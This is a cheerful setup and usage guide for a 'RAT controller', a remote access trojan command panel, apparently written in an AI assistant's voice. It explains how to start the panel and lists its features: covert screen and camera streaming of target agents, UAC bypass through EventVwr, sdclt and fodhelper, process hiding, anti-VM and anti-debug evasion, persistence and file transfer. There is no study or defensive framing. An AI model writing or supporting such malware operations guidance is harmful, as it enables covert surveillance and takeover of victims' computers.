# 🚀 How to Run Your Advanced RAT Controller

## ✅ **Your Controller is Now Running!**

Your controller with the new organized navigation system is currently running at:
**http://localhost:8081**

## 🔑 **Login Information**
- **Password**: `q`
- **URL**: http://localhost:8081

## 📋 **Quick Start Methods**

### **Method 1: Using the Run Script (Recommended)**
```bash
./run_controller.sh
```

### **Method 2: Manual Setup**
```bash
# Create virtual environment
python3 -m venv venv

# Activate virtual environment
source venv/bin/activate

# Install dependencies
pip install eventlet flask flask-socketio

# Run the controller
python controller.py
```

### **Method 3: Using Environment Variables**
```bash
# Set custom port (optional)
export PORT=8082

# Run with custom settings
source venv/bin/activate
python controller.py
```

## 🌐 **Accessing the Interface**

1. **Open your web browser**
2. **Go to**: http://localhost:8081
3. **Login with password**: `q`
4. **You'll see the new organized navigation!**

## 🎯 **New Navigation Features**

### **Navigation Bar**
You'll see 8 organized sections:
- **Dashboard** - Main overview and metrics
- **Streaming** - Screen and camera streaming with clean containers
- **Security** - UAC bypass and evasion methods
- **Monitoring** - Real-time system monitoring
- **Persistence** - Persistence mechanisms
- **File Transfer** - File upload/download
- **Agent Control** - Individual agent management
- **Settings** - Configuration settings

### **Streaming Interface**
- **Screen Stream** (left container) - Full screen capture controls
- **Camera Stream** (right container) - Camera with audio controls
- **Control Panel** - Quality settings and real-time statistics
- **Agent Selection** - Dropdown to choose target agents

### **Security Interface**
- **UAC Bypass Methods** - EventVwr.exe, sdclt.exe, fodhelper.exe
- **Evasion Techniques** - Process hiding, anti-VM, anti-debug
- **Risk Indicators** - Color-coded risk levels
- **Apply Buttons** - Execute security methods

## 🔧 **Troubleshooting**

### **Port Already in Use**
If you get "Address already in use" error:
```bash
# Kill existing process
pkill -f "python controller.py"

# Or use a different port
export PORT=8082
python controller.py
```

### **Dependencies Missing**
If you get import errors:
```bash
# Reinstall dependencies
source venv/bin/activate
pip install --upgrade eventlet flask flask-socketio
```

### **Permission Issues**
```bash
# Make run script executable
chmod +x run_controller.sh

# Or run manually
python3 -m venv venv
source venv/bin/activate
pip install eventlet flask flask-socketio
python controller.py
```

## 📱 **Browser Compatibility**

The interface works best with:
- **Chrome** (recommended)
- **Firefox**
- **Safari**
- **Edge**

## 🔒 **Security Notes**

- **Default password**: `q` (change this in production)
- **Server runs on**: `0.0.0.0:8081` (accessible from any IP)
- **Session timeout**: 3600 seconds (1 hour)
- **Max login attempts**: 5

## 🎨 **UI Features**

### **Original Style Preserved**
- Deep black background with blue gradients
- Cyan accent colors
- Glass morphism effects
- Smooth animations and transitions

### **Navigation Design**
- Active state highlighting
- Hover effects
- Consistent spacing and typography
- Professional layout

## 🚀 **What You Can Do Now**

1. **Navigate between sections** using the top navigation bar
2. **Access streaming interface** with clean square containers
3. **Manage security** with organized UAC bypass methods
4. **Monitor agents** in real-time
5. **Control individual agents** through the interface

## 📞 **Getting Help**

If you encounter issues:
1. Check the terminal output for error messages
2. Ensure all dependencies are installed
3. Try a different port if 8081 is busy
4. Restart the virtual environment

## 🎉 **Enjoy Your New Navigation System!**

Your controller now has a professional, organized interface that makes it easy to access all the advanced RAT features. The streaming interface provides clean square containers for screen and camera streams, and the security interface offers comprehensive UAC bypass and evasion methods.

**Happy controlling! 🎮**